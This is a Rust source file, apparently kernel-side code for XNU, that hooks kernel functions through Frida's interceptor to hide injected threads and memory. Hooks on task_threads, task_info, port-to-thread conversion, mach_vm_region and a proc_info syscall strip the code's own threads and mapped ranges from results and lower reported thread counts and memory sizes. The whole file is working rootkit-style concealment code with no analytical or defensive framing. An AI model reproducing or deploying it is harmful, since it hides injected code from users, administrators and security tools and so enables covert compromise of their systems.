
use core::ffi::c_int;
use core::ffi::c_void;

pub fn hide_our_threads() {
    hide_us_from_the_thread_list();
    say_no_port_names_one_of_ours();
    say_less_of_what_a_task_holds();
    hide_what_we_have_in_a_process();


    if unsafe { HIDDEN } {
        return;
    }
    unsafe { HIDDEN = true };

    let calls = unsafe { crate::xnu_bell::_sysent };
    if calls == 0 {
        return;
    }

    let signed = unsafe {
        ((calls + ASKING_ABOUT_A_PROCESS * AN_ENTRY) as *const u64).read_volatile()
    };
    let asking = unsafe { crate::pac::ptrauth_strip_data(signed as *const u8) };

    unsafe {
        WHERE_IT_IS_ASKED = asking as *mut c_void;
        let interceptor = crate::bindings::gum_interceptor_obtain();
        crate::bindings::gum_interceptor_begin_transaction(interceptor);
        crate::bindings::gum_interceptor_replace(interceptor, asking as *mut c_void,
            say_what_it_has as *mut c_void, (&raw mut THE_ANSWER) as *mut *mut c_void,
            core::ptr::null_mut());
        crate::bindings::gum_interceptor_end_transaction(interceptor);
    }
}

pub fn show_our_threads_again() {
    if !unsafe { HIDDEN } {
        return;
    }
    unsafe { HIDDEN = false };

    unsafe {
        let interceptor = crate::bindings::gum_interceptor_obtain();
        crate::bindings::gum_interceptor_begin_transaction(interceptor);
        if !WHERE_IT_IS_ASKED.is_null() {
            crate::bindings::gum_interceptor_revert(interceptor, WHERE_IT_IS_ASKED);
        }
        if !WHERE_THE_LIST_IS_ASKED.is_null() {
            crate::bindings::gum_interceptor_revert(interceptor, WHERE_THE_LIST_IS_ASKED);
        }
        if !WHERE_A_RANGE_IS_ASKED.is_null() {
            crate::bindings::gum_interceptor_revert(interceptor, WHERE_A_RANGE_IS_ASKED);
        }
        if !WHERE_A_DEEPER_RANGE_IS_ASKED.is_null() {
            crate::bindings::gum_interceptor_revert(interceptor, WHERE_A_DEEPER_RANGE_IS_ASKED);
        }
        crate::bindings::gum_interceptor_end_transaction(interceptor);
        THE_ANSWER = None;
        THE_LIST = None;
        THE_RANGE = None;
        THE_DEEPER_RANGE = None;
        WHERE_A_RANGE_IS_ASKED = core::ptr::null_mut();
        WHERE_A_DEEPER_RANGE_IS_ASKED = core::ptr::null_mut();
        HIDDEN_FROM_THE_MAP = false;
        WHERE_IT_IS_ASKED = core::ptr::null_mut();
        WHERE_THE_LIST_IS_ASKED = core::ptr::null_mut();
        HIDDEN_FROM_THE_LIST = false;
    }
}

fn hide_us_from_the_thread_list() {
    if unsafe { HIDDEN_FROM_THE_LIST } {
        return;
    }
    unsafe { HIDDEN_FROM_THE_LIST = true };

    let Some(asking) = (unsafe { _task_threads }) else {
        return;
    };

    unsafe {
        WHERE_THE_LIST_IS_ASKED = asking as *mut c_void;
        let interceptor = crate::bindings::gum_interceptor_obtain();
        crate::bindings::gum_interceptor_begin_transaction(interceptor);
        crate::bindings::gum_interceptor_replace(interceptor, asking as *mut c_void,
            say_which_threads as *mut c_void, (&raw mut THE_LIST) as *mut *mut c_void,
            core::ptr::null_mut());
        crate::bindings::gum_interceptor_end_transaction(interceptor);
    }
}

fn say_less_of_what_a_task_holds() {
    if unsafe { LESS_IS_SAID } {
        return;
    }
    unsafe { LESS_IS_SAID = true };

    let Some(asking) = (unsafe { _task_info }) else {
        return;
    };

    unsafe {
        let interceptor = crate::bindings::gum_interceptor_obtain();
        crate::bindings::gum_interceptor_begin_transaction(interceptor);
        crate::bindings::gum_interceptor_replace(interceptor, asking as *mut c_void,
            say_what_the_task_holds as *mut c_void, (&raw mut WHAT_IT_HOLDS) as *mut *mut c_void,
            core::ptr::null_mut());
        crate::bindings::gum_interceptor_end_transaction(interceptor);
    }
}

unsafe extern "C" fn say_what_the_task_holds(port: *mut c_void, what: u32, said: *mut u8,
    how_much: *mut u32) -> c_int
{
    let went = match unsafe { WHAT_IT_HOLDS } {
        Some(ask_it) => unsafe { ask_it(port, what, said, how_much) },
        None => 0,
    };
    if went != 0 || said.is_null() || asked_by_one_of_ours() {
        return went;
    }

    let (Some(id), room) = (crate::xnu_injection::whose_task_does_this_port_name(port),
        unsafe { *how_much } as usize * 4)
    else {
        return went;
    };

    let (mut ours_of_it, mut ranges) = (0u64, 0u32);
    crate::xnu_injection::what_we_have_in_process(id, &mut |_, size| {
        ours_of_it += size;
        ranges += 1;
    });
    if ours_of_it == 0 {
        return went;
    }

    let take_from = |at: usize, less: u64| {
        if at + 8 > room {
            return;
        }
        let word = unsafe { (said.add(at) as *const u64).read_unaligned() };
        unsafe { (said.add(at) as *mut u64).write_unaligned(word.saturating_sub(less)) };
    };
    let take_from_a_count = |at: usize, less: u32| {
        if at + 4 > room {
            return;
        }
        let count = unsafe { (said.add(at) as *const u32).read_unaligned() };
        unsafe { (said.add(at) as *mut u32).write_unaligned(count.saturating_sub(less)) };
    };

    match what {
        HOW_THE_TASK_IS => {
            take_from(WHAT_A_TASK_HAS_MAPPED, ours_of_it);
            take_from(WHAT_OF_IT_IS_THERE, ours_of_it);
        }
        WHAT_THE_TASK_HAS_MAPPED | WHAT_THE_TASK_HAS_MAPPED_AND_MAY_LOSE => {
            take_from(WHAT_A_MAP_HAS_IN_IT, ours_of_it);
            take_from_a_count(HOW_MANY_RANGES_IT_TOOK, ranges);
            take_from(WHAT_OF_A_MAP_IS_THERE, ours_of_it);
        }
        _ => {}
    }

    went
}

static mut LESS_IS_SAID: bool = false;
static mut WHAT_IT_HOLDS:
    Option<unsafe extern "C" fn(*mut c_void, u32, *mut u8, *mut u32) -> c_int> = None;

const HOW_THE_TASK_IS: u32 = 5;
const WHAT_A_TASK_HAS_MAPPED: usize = 8;
const WHAT_OF_IT_IS_THERE: usize = 16;

const WHAT_THE_TASK_HAS_MAPPED: u32 = 22;
const WHAT_THE_TASK_HAS_MAPPED_AND_MAY_LOSE: u32 = 23;
const WHAT_A_MAP_HAS_IN_IT: usize = 0;
const HOW_MANY_RANGES_IT_TOOK: usize = 8;
const WHAT_OF_A_MAP_IS_THERE: usize = 16;

fn say_no_port_names_one_of_ours() {
    if unsafe { NOTHING_IS_NAMED } {
        return;
    }
    unsafe { NOTHING_IS_NAMED = true };

    let turning = [
        (unsafe { _convert_port_to_thread }, (&raw mut A_THREAD) as *mut *mut c_void,
            say_it_names_nothing as *mut c_void),
        (unsafe { _convert_port_to_thread_read }, (&raw mut A_THREAD_TO_READ) as *mut *mut c_void,
            say_it_names_nothing_to_read as *mut c_void),
        (unsafe { _convert_port_to_thread_inspect },
            (&raw mut A_THREAD_TO_LOOK_AT) as *mut *mut c_void,
            say_it_names_nothing_to_look_at as *mut c_void),
    ];

    let interceptor = unsafe { crate::bindings::gum_interceptor_obtain() };
    unsafe { crate::bindings::gum_interceptor_begin_transaction(interceptor) };
    for (asking, held, ours) in turning {
        let Some(asking) = asking else {
            continue;
        };
        unsafe {
            crate::bindings::gum_interceptor_replace(interceptor, asking as *mut c_void, ours,
                held, core::ptr::null_mut());
        }
    }
    unsafe { crate::bindings::gum_interceptor_end_transaction(interceptor) };
}

unsafe extern "C" fn say_it_names_nothing(port: *mut c_void) -> *mut c_void {
    turn_it_into_a_thread(port, unsafe { A_THREAD })
}

unsafe extern "C" fn say_it_names_nothing_to_read(port: *mut c_void) -> *mut c_void {
    turn_it_into_a_thread(port, unsafe { A_THREAD_TO_READ })
}

unsafe extern "C" fn say_it_names_nothing_to_look_at(port: *mut c_void) -> *mut c_void {
    turn_it_into_a_thread(port, unsafe { A_THREAD_TO_LOOK_AT })
}

fn turn_it_into_a_thread(port: *mut c_void, turning: Option<TurnAPortIntoAThread>)
    -> *mut c_void
{
    if !asked_by_one_of_ours() && names_one_of_our_threads(port as u64) {
        return core::ptr::null_mut();
    }

    match turning {
        Some(turn_it) => unsafe { turn_it(port) },
        None => core::ptr::null_mut(),
    }
}

fn names_one_of_our_threads(port: u64) -> bool {
    if !looks_like_the_kernel(port) {
        return false;
    }

    let at = unsafe { WHERE_A_PORT_HOLDS_ITS_THREAD };
    if at != 0 {
        return ours_is_held_at(port, at);
    }

    for word in 1..HOW_FAR_INTO_A_PORT {
        if ours_is_held_at(port, word * 8) {
            unsafe { WHERE_A_PORT_HOLDS_ITS_THREAD = word * 8 };
            return true;
        }
    }

    false
}

static mut WHERE_A_PORT_HOLDS_ITS_THREAD: usize = 0;

type TurnAPortIntoAThread = unsafe extern "C" fn(*mut c_void) -> *mut c_void;

static mut NOTHING_IS_NAMED: bool = false;
static mut A_THREAD: Option<TurnAPortIntoAThread> = None;
static mut A_THREAD_TO_READ: Option<TurnAPortIntoAThread> = None;
static mut A_THREAD_TO_LOOK_AT: Option<TurnAPortIntoAThread> = None;

unsafe extern "C" fn say_which_threads(task: *mut c_void, threads: *mut *mut u64,
    how_many: *mut u32) -> c_int
{
    let went = match unsafe { THE_LIST } {
        Some(ask_it) => unsafe { ask_it(task, threads, how_many) },
        None => 0,
    };
    if went != 0 {
        return went;
    }
    let only_counting = asked_by_one_of_ours();

    let said = unsafe { *threads };
    let count = unsafe { *how_many } as usize;
    if said.is_null() || count == 0 {
        return went;
    }

    let mut kept = 0;
    for step in 0..count {
        let signed = unsafe { said.add(step).read() };
        if is_one_of_our_threads(signed) {
            continue;
        }
        if !only_counting {
            unsafe { said.add(kept).write(signed) };
        }
        kept += 1;
    }

    if only_counting {
        return went;
    }

    for step in kept..count {
        unsafe { said.add(step).write(0) };
    }
    unsafe { *how_many = kept as u32 };


    went
}

fn is_one_of_our_threads(signed: u64) -> bool {
    let held = unsafe { crate::pac::ptrauth_strip_pointer(signed as *const u8) } as u64;
    if !looks_like_the_kernel(held) {
        return false;
    }

    if our_threads().contains(&held) {
        return true;
    }

    let at = unsafe { WHERE_A_PORT_SAYS_ITS_THREAD };
    if at != 0 {
        return ours_is_held_at(held, at);
    }

    for word in 1..HOW_FAR_INTO_A_PORT {
        if ours_is_held_at(held, word * 8) {
            unsafe { WHERE_A_PORT_SAYS_ITS_THREAD = word * 8 };
            return true;
        }
    }

    false
}

fn ours_is_held_at(port: u64, at: usize) -> bool {
    let Some(held) = a_word_of(port, at) else {
        return false;
    };
    let held = unsafe { crate::pac::ptrauth_strip_pointer(held as *const u8) } as u64;

    looks_like_the_kernel(held) && our_threads().contains(&held)
}

pub fn a_word_of(at: u64, step: usize) -> Option<u64> {
    if step + 8 > room_in_the_page(at) {
        return None;
    }

    Some(unsafe { ((at as usize + step) as *const u64).read_volatile() })
}

pub fn room_in_the_page(at: u64) -> usize {
    A_PAGE - (at as usize & (A_PAGE - 1))
}

const A_PAGE: usize = 0x1000;

fn looks_like_the_kernel(at: u64) -> bool {
    at >= WHERE_THE_KERNEL_BEGINS && (at & 7) == 0
}

pub fn a_thread_of_ours(thread: *mut c_void) {
    let thread = thread as u64;
    if thread == 0 || our_threads().contains(&thread) {
        return;
    }

    if let Some(free) = our_threads().iter_mut().find(|kept| **kept == 0) {
        *free = thread;
    }
}

pub fn no_longer_a_thread_of_ours(thread: *mut c_void) {
    for kept in our_threads().iter_mut().filter(|kept| **kept == thread as u64) {
        *kept = 0;
    }
}

fn our_threads() -> &'static mut [u64; MOST_OF_OURS] {
    unsafe { (&raw mut OUR_THREADS).as_mut().unwrap() }
}

fn asked_by_one_of_ours() -> bool {
    let Some(this_thread) = (unsafe { _current_thread }) else {
        return false;
    };

    our_threads().contains(&(unsafe { this_thread() } as u64))
}

fn hide_what_we_have_in_a_process() {
    if unsafe { HIDDEN_FROM_THE_MAP } {
        return;
    }
    unsafe { HIDDEN_FROM_THE_MAP = true };

    let (Some(one_range), Some(one_range_deeper)) = (unsafe { _mach_vm_region },
        unsafe { _mach_vm_region_recurse })
    else {
        return;
    };

    unsafe {
        WHERE_A_RANGE_IS_ASKED = one_range as *mut c_void;
        WHERE_A_DEEPER_RANGE_IS_ASKED = one_range_deeper as *mut c_void;
        let interceptor = crate::bindings::gum_interceptor_obtain();
        crate::bindings::gum_interceptor_begin_transaction(interceptor);
        crate::bindings::gum_interceptor_replace(interceptor, one_range as *mut c_void,
            say_what_is_there as *mut c_void, (&raw mut THE_RANGE) as *mut *mut c_void,
            core::ptr::null_mut());
        crate::bindings::gum_interceptor_replace(interceptor, one_range_deeper as *mut c_void,
            say_what_is_there_deeper as *mut c_void, (&raw mut THE_DEEPER_RANGE) as *mut *mut c_void,
            core::ptr::null_mut());
        crate::bindings::gum_interceptor_end_transaction(interceptor);
    }
}

unsafe extern "C" fn say_what_is_there(map: *mut c_void, address: *mut u64, size: *mut u64,
    flavour: c_int, into: *mut c_void, count: *mut u32, named: *mut u32) -> c_int
{
    let Some(ask_it) = (unsafe { THE_RANGE }) else {
        return 0;
    };

    let mut went = unsafe { ask_it(map, address, size, flavour, into, count, named) };
    if asked_by_one_of_ours() {
        return went;
    }

    for _ in 0..HOW_MANY_OF_OURS_IN_A_ROW {
        if went != 0 {
            break;
        }
        let Some(past) = ours_is_there(map, unsafe { *address }, unsafe { *size }) else {
            break;
        };
        unsafe { *address = past };
        went = unsafe { ask_it(map, address, size, flavour, into, count, named) };
    }

    went
}

unsafe extern "C" fn say_what_is_there_deeper(map: *mut c_void, address: *mut u64, size: *mut u64,
    depth: *mut u32, into: *mut c_void, count: *mut u32) -> c_int
{
    let Some(ask_it) = (unsafe { THE_DEEPER_RANGE }) else {
        return 0;
    };

    let mut went = unsafe { ask_it(map, address, size, depth, into, count) };
    if asked_by_one_of_ours() {
        return went;
    }

    for _ in 0..HOW_MANY_OF_OURS_IN_A_ROW {
        if went != 0 {
            break;
        }
        let Some(past) = ours_is_there(map, unsafe { *address }, unsafe { *size }) else {
            break;
        };
        unsafe { *address = past };
        went = unsafe { ask_it(map, address, size, depth, into, count) };
    }

    went
}

fn ours_is_there(map: *mut c_void, address: u64, size: u64) -> Option<u64> {
    let mut past = None;
    crate::xnu_injection::what_we_have_in(map, &mut |at, how_much| {
        if past.is_none() && address < at + how_much && at < address + size {
            past = Some(at + how_much);
        }
    });

    past
}

pub fn one_of_ours(number: u64) {
    if number == 0 || ours().contains(&number) {
        return;
    }

    if let Some(free) = ours().iter_mut().find(|kept| **kept == 0) {
        *free = number;
    }
}

pub fn forget_the_threads_of(arena: u64) {
    let said = unsafe { ((arena + crate::xnu_relay::OUR_THREADS) as *const u64) };
    for step in 0..MOST_OF_OURS_IN_ONE {
        let number = unsafe { said.add(step).read_volatile() };
        for kept in ours().iter_mut().filter(|kept| **kept == number && number != 0) {
            *kept = 0;
        }
    }
}

pub fn take_note_of_what_a_copy_says(arena: u64) {
    let said = unsafe { ((arena + crate::xnu_relay::OUR_THREADS) as *const u64) };
    for step in 0..MOST_OF_OURS_IN_ONE {
        one_of_ours(unsafe { said.add(step).read_volatile() });
    }

}

fn take_ours_out_of_the_count(asked: &Asked, went: c_int) -> c_int {
    let ours_there = crate::xnu_injection::how_many_of_ours_are_in(asked.id as u32);
    let mut ours_of_it = 0u64;
    crate::xnu_injection::what_we_have_in_process(asked.id as u32, &mut |_, room| {
        ours_of_it += room;
    });
    if ours_there == 0 || asked.into == 0 {
        return went;
    }
    let (Some(fetch), Some(put_back)) = (unsafe { _copyin }, unsafe { _copyout }) else {
        return went;
    };

    let mut said = [0u8; HOW_THE_TASK_IS_SAID_TO_BE_DOING];
    let room = said.len() as u64;
    if unsafe { fetch(asked.into, said.as_mut_ptr() as *mut c_void, room) } != 0 {
        return went;
    }

    let counted = u32::from_le_bytes(said[HOW_MANY_THREADS..HOW_MANY_THREADS + 4]
        .try_into().unwrap());
    said[HOW_MANY_THREADS..HOW_MANY_THREADS + 4]
        .copy_from_slice(&counted.saturating_sub(ours_there).to_le_bytes());

    for at in [HOW_MUCH_IS_MAPPED, HOW_MUCH_OF_IT_IS_THERE] {
        let said_to_be = u64::from_le_bytes(said[at..at + 8].try_into().unwrap());
        said[at..at + 8].copy_from_slice(&said_to_be.saturating_sub(ours_of_it).to_le_bytes());
    }

    unsafe { put_back(said.as_ptr() as *const c_void, asked.into, room) };

    went
}

fn say_what_the_process_has_there(process: *mut c_void, asked: &mut Asked, answer: *mut i32,
    went: c_int) -> c_int
{
    let Some(ask_it) = (unsafe { THE_ANSWER }) else {
        return went;
    };
    let Some(fetch) = (unsafe { _copyin }) else {
        return went;
    };
    if asked.into == 0 {
        return went;
    }

    let mut answered = went;
    for _ in 0..MOST_RANGES_OF_OURS_IN_A_ROW {
        if answered != 0 {
            return answered;
        }

        let mut said = [0u8; WHAT_A_REGION_IS_SAID_TO_BE];
        if unsafe { fetch(asked.into, said.as_mut_ptr() as *mut c_void, said.len() as u64) } != 0 {
            return answered;
        }
        let word = |at: usize| u64::from_le_bytes(said[at..at + 8].try_into().unwrap());
        let (there, size) = (word(WHERE_A_REGION_IS), word(HOW_BIG_A_REGION_IS));

        let mut is_ours = false;
        crate::xnu_injection::what_we_have_in_process(asked.id as u32, &mut |at, room| {
            is_ours |= there >= at && there < at + room;
        });
        if !is_ours {
            return answered;
        }

        asked.about = there + size;
        answered = unsafe { ask_it(process, asked as *mut Asked as *mut c_void, answer) };
    }

    answered
}

unsafe extern "C" fn say_what_it_has(process: *mut c_void, asked: *mut c_void, answer: *mut i32)
    -> c_int
{
    let went = match unsafe { THE_ANSWER } {
        Some(ask_it) => unsafe { ask_it(process, asked, answer) },
        None => 0,
    };

    if asked.is_null() || answer.is_null() {
        return went;
    }


    let asked = unsafe { &mut *(asked as *mut Asked) };
    if went != 0 || asked_by_one_of_ours() {
        return went;
    }

    if asked.what == HOW_THE_TASK_IS_DOING {
        return take_ours_out_of_the_count(asked, went);
    }
    if asked.what == A_REGION || asked.what == A_REGION_AND_WHERE_IT_CAME_FROM {
        return say_what_the_process_has_there(process, asked, answer, went);
    }
    if asked.what != LISTING_ITS_THREADS {
        return went;
    }
    let said = unsafe { *answer } as usize;
    let how_many = said / core::mem::size_of::<u64>();
    if how_many == 0 || how_many > MOST_THREADS_IN_ONE || asked.into == 0 {
        return went;
    }

    let (Some(fetch), Some(put_back)) = (unsafe { _copyin }, unsafe { _copyout }) else {
        return went;
    };

    let mut numbers = [0u64; MOST_THREADS_IN_ONE];
    let room = (how_many * core::mem::size_of::<u64>()) as u64;
    if unsafe { fetch(asked.into, numbers.as_mut_ptr() as *mut c_void, room) } != 0 {
        return went;
    }

    let mut kept = 0;
    for step in 0..how_many {
        if ours().contains(&numbers[step]) {
            continue;
        }
        numbers[kept] = numbers[step];
        kept += 1;
    }
    if kept == how_many {
        return went;
    }

    let left = (kept * core::mem::size_of::<u64>()) as u64;
    if unsafe { put_back(numbers.as_ptr() as *const c_void, asked.into, left) } != 0 {
        return went;
    }
    unsafe { *answer = left as i32 };

    went
}

#[repr(C)]
struct Asked {
    which: u64,
    id: u64,
    what: u64,
    about: u64,
    into: u64,
    room: u64,
}

fn ours() -> &'static mut [u64; MOST_OF_OURS] {
    unsafe { (&raw mut OURS).as_mut().unwrap() }
}

static mut HIDDEN: bool = false;
static mut HIDDEN_FROM_THE_LIST: bool = false;
static mut HIDDEN_FROM_THE_MAP: bool = false;
static mut THE_RANGE: Option<unsafe extern "C" fn(*mut c_void, *mut u64, *mut u64, c_int,
    *mut c_void, *mut u32, *mut u32) -> c_int> = None;
static mut THE_DEEPER_RANGE: Option<unsafe extern "C" fn(*mut c_void, *mut u64, *mut u64,
    *mut u32, *mut c_void, *mut u32) -> c_int> = None;
static mut WHERE_A_RANGE_IS_ASKED: *mut c_void = core::ptr::null_mut();
static mut WHERE_A_DEEPER_RANGE_IS_ASKED: *mut c_void = core::ptr::null_mut();
static mut THE_LIST: Option<unsafe extern "C" fn(*mut c_void, *mut *mut u64, *mut u32) -> c_int> =
    None;
static mut WHERE_THE_LIST_IS_ASKED: *mut c_void = core::ptr::null_mut();
static mut WHERE_A_PORT_SAYS_ITS_THREAD: usize = 0;
static mut OUR_THREADS: [u64; MOST_OF_OURS] = [0; MOST_OF_OURS];
static mut THE_ANSWER: Option<unsafe extern "C" fn(*mut c_void, *mut c_void, *mut i32) -> c_int> =
    None;
static mut WHERE_IT_IS_ASKED: *mut c_void = core::ptr::null_mut();
static mut OURS: [u64; MOST_OF_OURS] = [0; MOST_OF_OURS];

pub const MOST_OF_OURS_IN_ONE: usize = 8;
const MOST_OF_OURS: usize = 128;
const HOW_FAR_INTO_A_PORT: usize = 32;
const WHERE_THE_KERNEL_BEGINS: u64 = 0xffff_fe00_0000_0000;
const MOST_THREADS_IN_ONE: usize = 64;
const HOW_MANY_OF_OURS_IN_A_ROW: usize = 8;
const ASKING_ABOUT_A_PROCESS: usize = 336;
const AN_ENTRY: usize = 24;
const LISTING_ITS_THREADS: u64 = 6;
const HOW_THE_TASK_IS_DOING: u64 = 4;
const A_REGION: u64 = 7;
const A_REGION_AND_WHERE_IT_CAME_FROM: u64 = 8;

const HOW_THE_TASK_IS_SAID_TO_BE_DOING: usize = 96;
const HOW_MANY_THREADS: usize = 84;
const HOW_MUCH_IS_MAPPED: usize = 0;
const HOW_MUCH_OF_IT_IS_THERE: usize = 8;

const WHAT_A_REGION_IS_SAID_TO_BE: usize = 96;
const WHERE_A_REGION_IS: usize = 80;
const HOW_BIG_A_REGION_IS: usize = 88;
const MOST_RANGES_OF_OURS_IN_A_ROW: usize = 32;

unsafe extern "C" {
    static _mach_vm_region: Option<unsafe extern "C" fn(*mut c_void, *mut u64, *mut u64, c_int,
        *mut c_void, *mut u32, *mut u32) -> c_int>;
    static _mach_vm_region_recurse: Option<unsafe extern "C" fn(*mut c_void, *mut u64, *mut u64,
        *mut u32, *mut c_void, *mut u32) -> c_int>;
    static _copyin: Option<unsafe extern "C" fn(u64, *mut c_void, u64) -> c_int>;
    static _copyout: Option<unsafe extern "C" fn(*const c_void, u64, u64) -> c_int>;
    static _current_thread: Option<unsafe extern "C" fn() -> *mut c_void>;
    static _task_info: Option<unsafe extern "C" fn(*mut c_void, u32, *mut u8, *mut u32) -> c_int>;
    static _convert_port_to_thread: Option<TurnAPortIntoAThread>;
    static _convert_port_to_thread_read: Option<TurnAPortIntoAThread>;
    static _convert_port_to_thread_inspect: Option<TurnAPortIntoAThread>;
    static _task_threads:
        Option<unsafe extern "C" fn(*mut c_void, *mut *mut u64, *mut u32) -> c_int>;
}
